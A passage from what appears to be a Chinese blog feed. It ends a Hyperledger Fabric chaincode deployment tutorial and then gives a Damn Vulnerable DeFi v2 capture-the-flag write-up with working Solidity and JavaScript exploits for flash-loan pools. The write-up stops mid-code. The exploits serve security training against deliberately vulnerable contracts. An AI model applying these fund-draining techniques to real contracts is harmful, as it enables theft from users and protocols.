</span>lifecycle chaincode install basic.tar.gz<br></code></pre></td></tr></table></figure><p>在org2中安装</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">test-network git:(ad8fc2f) ✗ <span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org2MSP&quot;</span><br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt<br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp<br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=localhost:9051<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer </span>lifecycle chaincode install basic.tar.gz<br><br></code></pre></td></tr></table></figure><p><img src="/2022/07/10/fabric%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20220709214302474.png" alt="image-20220709214302474"></p><p>解决：</p><p>将工作区的<code>bin</code>子目录添加到<code>PATH</code>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$PATH</span>:$(go env GOPATH)/bin<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">GOPATH</span>=$(go env GOPATH)。<br></code></pre></td></tr></table></figure><p>修改GOPATH</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">vim /etc<span class="hljs-built_in">/profile</span><br><span class="hljs-built_in"></span><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">GOROOT</span>=/usr/local/go  #设置为go安装的路径，有些安装包会自动设置默认的goroot<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">GOPATH</span>=<span class="hljs-variable">$HOME</span>/gocode   #默认安装包的路径<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$PATH</span>:$GOROOT/bin:$GOPATH/bin<br>source /etc/profile<br></code></pre></td></tr></table></figure><p>然后，解决方案，到链码所在的目录下提前下载依赖包</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> fabric-samples/asset-transfer-basic/chaincode-<span class="hljs-keyword">go</span><br><br><span class="hljs-keyword">go</span> env -<span class="hljs-keyword">w</span> GOPROXY=http<span class="hljs-variable">s:</span>//goproxy.io,direct<br><span class="hljs-keyword">go</span> env -<span class="hljs-keyword">w</span> GO111MODULE=<span class="hljs-keyword">on</span><br><span class="hljs-keyword">go</span> <span class="hljs-keyword">mod</span> vendor<br></code></pre></td></tr></table></figure><p>再重新打包智能合约并安装链码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">peer lifecycle chaincode package basic.tar.gz --path ../asset-transfer-basic/chaincode-go/ --lang golang --label basic_1<span class="hljs-number">.0</span><br>peer lifecycle chaincode install basic.tar.gz<br></code></pre></td></tr></table></figure><h3 id="Approve-chaincode"><a href="#Approve-chaincode" class="headerlink" title="Approve chaincode"></a>Approve chaincode</h3><p>查看一下chaincode是否已经安装到当前组织</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">➜  <span class="hljs-keyword">test</span>-network git:(ad8fc2f) ✗ peer lifecycle chaincode queryinstalled<br><br>Installed chaincodes <span class="hljs-keyword">on</span> peer:<br><br>Package ID: basic_1.0:950c4b082bc8229268015e94e544db76afeb7086fbb52980387bd5e1bd0b41b3, <span class="hljs-keyword">Label</span>: basic_1.0<br></code></pre></td></tr></table></figure><p>设置<code>CC_PACKAGE_ID</code>,</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">export</span> CC_PACKAGE_ID=basic_<span class="hljs-number">1</span>.<span class="hljs-number">0</span>:<span class="hljs-number">950</span>c<span class="hljs-number">4</span>b<span class="hljs-number">082</span>bc<span class="hljs-number">8229268015</span>e<span class="hljs-number">94</span>e<span class="hljs-number">544</span>db<span class="hljs-number">76</span>afeb<span class="hljs-number">7086</span>fbb<span class="hljs-number">52980387</span>bd<span class="hljs-number">5</span>e<span class="hljs-number">1</span>bd<span class="hljs-number">0</span>b<span class="hljs-number">41</span>b<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>执行（此时是在org2）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode approveformyorg -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --channelID channel1 --name basic --version <span class="hljs-number">1.0</span> --package-id <span class="hljs-variable">$CC_PACKAGE_ID</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br><br></code></pre></td></tr></table></figure><p>切换到org1后，再次执行approve操作</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">export CORE_PEER_LOCALMSPID=<span class="hljs-string">&quot;Org1MSP&quot;</span><br><br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/u</span>sers<span class="hljs-regexp">/Admin@org1.example.com/m</span>sp<br><br>export CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls/ca.crt<br><br>export CORE_PEER_ADDRESS=localhost:<span class="hljs-number">7051</span><br><br>peer lifecycle chaincode approveformyorg -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --channelID channel1 --name basic --version <span class="hljs-number">1.0</span> --package-id <span class="hljs-variable">$CC_PACKAGE_ID</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br><br></code></pre></td></tr></table></figure><h3 id="提交chaincode"><a href="#提交chaincode" class="headerlink" title="提交chaincode"></a>提交chaincode</h3><p>使用<code>checkcommitreadiness</code>查看chaincode是否已经被approve</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">➜  test-network git:(ad8fc2f) ✗ peer lifecycle chaincode checkcommitreadiness --channelID channel1 --name basic --version <span class="hljs-number">1.0</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem --output json <br><br></code></pre></td></tr></table></figure><p>执行<code>commit</code>操作</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode commit -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --channelID channel1 --name basic --version <span class="hljs-number">1.0</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem --peerAddresses localhost:<span class="hljs-number">7051</span> --tlsRootCertFiles <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls<span class="hljs-regexp">/ca.crt --peerAddresses localhost:9051 --tlsRootCertFiles $&#123;PWD&#125;/</span>organizations<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/peers/</span>peer0.org2.example.com<span class="hljs-regexp">/tls/</span>ca.crt <br></code></pre></td></tr></table></figure><p>测试chaincode是否已经成功提交到channel</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">➜  test-network git:(ad8fc2f) ✗ peer lifecycle chaincode querycommitted --channelID channel1 --name basic --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br><br></code></pre></td></tr></table></figure><h3 id="invoke-chaincode"><a href="#invoke-chaincode" class="headerlink" title="invoke chaincode"></a>invoke chaincode</h3><p>invoke</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">peer chaincode invoke -o localhost<span class="hljs-function">:7050</span> <span class="hljs-params">--ordererTLSHostnameOverride</span> orderer.example.com <span class="hljs-params">--tls</span> <span class="hljs-params">--cafile</span> <span class="hljs-string">&quot;$&#123;PWD&#125;/organizations/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem&quot;</span> -C channel1 -n basic <span class="hljs-params">--peerAddresses</span> localhost<span class="hljs-function">:7051</span> <span class="hljs-params">--tlsRootCertFiles</span> <span class="hljs-string">&quot;$&#123;PWD&#125;/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt&quot;</span> <span class="hljs-params">--peerAddresses</span> localhost<span class="hljs-function">:9051</span> <span class="hljs-params">--tlsRootCertFiles</span> <span class="hljs-string">&quot;$&#123;PWD&#125;/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt&quot;</span> -c &#x27;&#123;<span class="hljs-string">&quot;function&quot;</span>:<span class="hljs-string">&quot;InitLedger&quot;</span>,<span class="hljs-string">&quot;Args&quot;</span>:[]&#125;&#x27;<br></code></pre></td></tr></table></figure><p>现在可以从 CLI 查询分类帐。运行以下命令以获取已添加到您的频道分类帐的资产列表：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">peer</span> chaincode query -C channel<span class="hljs-number">1</span> -n basic -c &#x27;&#123;<span class="hljs-string">&quot;Args&quot;</span>:[<span class="hljs-string">&quot;GetAllAssets&quot;</span>]&#125;&#x27;<br></code></pre></td></tr></table></figure><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p><a href="https://github1s.com/hyperledger/fabric-samples">hyperledger/fabric-samples合约代码</a></p><p>以上是自动化实现环境搭建，其中详细原理可以通过手动搭建环境来理解，参考以下文章：</p><p><a href="https://ifantasy.net/2022/03/29/hyperledger_fabric_0_test_network_explain/">Hyperledger Fabric的test-network启动过程Bash源码详解</a></p><p><a href="https://juejin.cn/post/7035894330631913509">一篇文章上手Fabric CA的使用</a></p><p><a href="https://juejin.cn/post/7035956873224257566">Fabric CA 操作指南</a></p><p>定制联盟链网络</p><p><a href="https://ifantasy.net/2022/04/01/hyperledger_fabric_1_custom_our_network/">Hyperledger Fabric定制联盟链网络工程实践</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>fabric</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup | Damn vulnerable defi v2</title>
    <link href="/2022/04/16/Damn%20vulnerable%20defi%20v2%20wp/"/>
    <url>/2022/04/16/Damn%20vulnerable%20defi%20v2%20wp/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.damnvulnerabledefi.xyz/">靶场链接</a></p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><ul><li><code>git clone https://github.com/tinchoabbate/damn-vulnerable-defi.git</code><br>（克隆存储库）</li><li><code>cd damn-vulnerable-defi/</code><br>（进入存储库）</li><li><code>npm install -g yarn</code><br>（当前节点版本全局安装yarn）</li><li><code>yarn</code><br>（确保在存储库中运行它以安装依赖项）</li></ul><p>使用<code>yarn run challenge-name</code>. 如果挑战成功执行，您就通过了！</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(yarn <span class="hljs-builtin-name">run</span> challenge-name失败可以尝试)<br><span class="hljs-builtin-name">set</span> <span class="hljs-attribute">http_proxy</span>=http://127.0.0.1:7890<br><span class="hljs-builtin-name">set</span> <span class="hljs-attribute">https_proxy</span>=http://127.0.0.1:7890<br></code></pre></td></tr></table></figure><h2 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h2><blockquote><p>There’s a lending pool with a million DVT tokens in balance, offering flash loans for free.</p><p>If only there was a way to attack and stop the pool from offering flash loans …</p><p>You start with 100 DVT tokens in balance.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function flashLoan(uint256 borrowAmount) external nonReentrant &#123;<br>        require(borrowAmount &gt; 0, &quot;Must borrow at least one token&quot;);<br><br>        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));<br>        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);<br><br>        // Ensured by the protocol via the `depositTokens` function<br>        assert(poolBalance == balanceBefore);<br>        <br>        damnValuableToken.transfer(msg.sender, borrowAmount);<br>        <br>        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);<br>        <br>        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));<br>        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);<br>    &#125;<br></code></pre></td></tr></table></figure><p>我们要做的是使 <code>poolBalance == balanceBefore</code> 不成立</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-comment">//await this.token.transfer(this.pool.address, 1, &#123; from: attacker&#125; );</span><br>    <span class="hljs-comment">// Make sure we interact with token contract as &quot;attacker&quot;.</span><br>    <span class="hljs-built_in">this</span>.token.connect(attacker);<br>    <span class="hljs-comment">// Send 1 token to pool.</span><br>    <span class="hljs-built_in">this</span>.token.transfer(<span class="hljs-built_in">this</span>.pool.address, <span class="hljs-number">1</span>);<br><br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Naive-receiver"><a href="#Naive-receiver" class="headerlink" title="Naive receiver"></a>Naive receiver</h2><blockquote><p>There’s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.</p><p>You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.</p><p>Drain all ETH funds from the user’s contract. Doing it in a single transaction is a big plus ;)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function receiveEther(uint256 fee) public payable &#123;<br>       require(msg.sender == pool, &quot;Sender must be pool&quot;);<br><br>       uint256 amountToBeRepaid = msg.value + fee;<br><br>       require(address(this).balance &gt;= amountToBeRepaid, &quot;Cannot borrow that much&quot;);<br>       <br>       _executeActionDuringFlashLoan();<br>       <br>       // Return funds to pool<br>       pool.sendValue(amountToBeRepaid);<br>   &#125;<br><br>   function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant &#123;<br><br>       uint256 balanceBefore = address(this).balance;<br>       require(balanceBefore &gt;= borrowAmount, &quot;Not enough ETH in pool&quot;);<br><br><br>       require(borrower.isContract(), &quot;Borrower must be a deployed contract&quot;);<br>       // Transfer ETH and handle control to receiver<br>       borrower.functionCallWithValue(<br>           abi.encodeWithSignature(<br>               &quot;receiveEther(uint256)&quot;,<br>               FIXED_FEE<br>           ),<br>           borrowAmount<br>       );<br>       <br>       require(<br>           address(this).balance &gt;= balanceBefore + FIXED_FEE,<br>           &quot;Flash loan hasn&#x27;t been paid back&quot;<br>       );<br>   &#125;<br></code></pre></td></tr></table></figure><p>可以利用receiveEther函数，支付10次手续费，但是要满足 <code>msg.sender == pool</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-built_in">this</span>.pool.connect(attacker);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">10</span>;i ++)&#123;<br>        <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.pool.flashLoan(<span class="hljs-built_in">this</span>.receiver.address,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h2><blockquote><p>More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.</p><p>Currently the pool has 1 million DVT tokens in balance. And you have nothing.</p><p>But don’t worry, you might be able to take them all from the pool. In a single transaction.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function flashLoan(<br>       uint256 borrowAmount,<br>       address borrower,<br>       address target,<br>       bytes calldata data<br>   )<br>       external<br>       nonReentrant<br>   &#123;<br>       uint256 balanceBefore = damnValuableToken.balanceOf(address(this));<br>       require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);<br>       <br>       damnValuableToken.transfer(borrower, borrowAmount);<br>       target.functionCall(data);<br><br>       uint256 balanceAfter = damnValuableToken.balanceOf(address(this));<br>       require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);<br>   &#125;<br></code></pre></td></tr></table></figure><ol><li>使用approve函数批准</li><li>调用flashLoan并利用data</li><li>transferFrom</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE  */</span><br>    <span class="hljs-keyword">const</span> data = <span class="hljs-built_in">this</span>.token.interface.encodeFunctionData(<span class="hljs-string">&quot;approve&quot;</span>, [attacker.address,TOKENS_IN_POOL.toHexString()],);<br><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.pool.connect(attacker).flashLoan(<span class="hljs-number">0</span>, attacker.address, <span class="hljs-built_in">this</span>.token.address, data);<br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.token.connect(attacker).transferFrom(<span class="hljs-built_in">this</span>.pool.address, attacker.address, TOKENS_IN_POOL);<br>&#125;);<br></code></pre></td></tr></table></figure><p><a href="https://docs.ethers.io/v5/api/utils/abi/interface/#Interface--encoding">interface.encodeFunctionData</a> 的用法</p><p><img src="/2022/04/16/Damn%20vulnerable%20defi%20v2%20wp/image-20220409140557860.png" alt="image-20220409140557860"></p><h2 id="Side-entrance"><a href="#Side-entrance" class="headerlink" title="Side entrance"></a>Side entrance</h2><blockquote><p>A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.</p><p>This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.</p><p>You must take all ETH from the lending pool.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IFlashLoanEtherReceiver &#123;<br>    function execute() external payable;<br>&#125;<br><br>contract SideEntranceLenderPool &#123;<br>    using Address for address payable;<br><br>    mapping (address =&gt; uint256) private balances;<br><br>    function deposit() external payable &#123;<br>        balances[msg.sender] += msg.value;<br>    &#125;<br><br>    function withdraw() external &#123;<br>        uint256 amountToWithdraw = balances[msg.sender];<br>        balances[msg.sender] = 0;<br>        msg.sender.sendValue(amountToWithdraw);<br>    &#125;<br><br>    function flashLoan(uint256 amount) external &#123;<br>        uint256 balanceBefore = address(this).balance;<br>        require(balanceBefore &gt;= amount, &quot;Not enough ETH in balance&quot;);<br>        <br>        IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();<br><br>        require(address(this).balance &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);        <br>    &#125;<br>&#125;<br> <br></code></pre></td></tr></table></figure><ol><li>调用flashLoan，中途把钱deposit回池中，使 <code>address(this).balance &gt;= balanceBefore</code> 成立</li><li>取出存款</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;../side-entrance/SideEntranceLenderPool.sol&quot;;<br>import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;<br><br>contract SideEntranceAttacker is IFlashLoanEtherReceiver&#123;<br>    using Address for address payable;<br><br>    SideEntranceLenderPool pool;<br><br>    function attack(SideEntranceLenderPool _pool) external &#123;<br>        pool = _pool;<br>        pool.flashLoan(address(pool).balance);<br>        pool.withdraw();<br>        payable(msg.sender).sendValue(address(this).balance);<br>    &#125;<br><br>    function execute() external payable override &#123;<br>        pool.deposit&#123;value:msg.value&#125;();<br>    &#125;<br><br>    receive() external payable&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** YOUR EXPLOIT GOES HERE */</span><br>    <span class="hljs-keyword">const</span> SideEntranceAttacker = <span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&#x27;SideEntranceAttacker&#x27;</span>,attacker);<br>    <span class="hljs-keyword">const</span> Attack = <span class="hljs-keyword">await</span> SideEntranceAttacker.deploy();<br>    <span class="hljs-keyword">await</span> Attack.attack(<span class="hljs-built_in">this</span>.pool.address);<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="The-rewarder"><a href="#The-rewarder" class="headerlink" title="The rewarder"></a>The rewarder</h2><blockquote><p>There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.</p><p>Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!</p><p>You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.</p><p>Oh, by the way, rumours say a new pool has just landed on mainnet. Isn’t it offering DVT tokens in flash loans?</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function distributeRewards() public returns (uint256) &#123;<br>    uint256 rewards = 0;<br><br>    if(isNewRewardsRound()) &#123;<br>        _recordSnapshot();<br>    &#125;        <br>    <br>    uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);<br>    uint256 amountDeposited = 